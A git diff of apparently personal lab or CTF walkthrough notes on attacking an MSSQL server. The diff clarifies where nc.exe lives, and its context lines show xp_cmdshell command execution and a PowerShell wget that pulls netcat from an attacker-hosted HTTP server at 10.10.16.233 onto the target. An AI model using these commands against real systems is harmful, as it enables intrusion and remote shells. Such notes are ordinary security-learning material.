@@ -45,7 +45,7 @@
 	* Confirm the command shell is enabled with: `xp_cmdshell "whoami"`
 ## Netcat
 
-* Locate the "nc.exe" file on machine, if not installed, it will need to be installed.
+* Locate the "nc.exe" file on Kali machine, if not installed, it will need to be installed.
 * In a separate terminal in Kali navigate to the directory where the "nc.exe" is and run: `sudo python3 -m http.server 80`
 	* Go back to xp_cmdshell and download "nc.exe" from local machine to target `xp_cmdshell powershell -c cd c:\Users\sql_svc\Downloads\; wget http://10.10.16.233/nc.exe -outfile nc.exe`
 	* The Netcat was downloaded to the target successfully after receiving the "200" status response code.
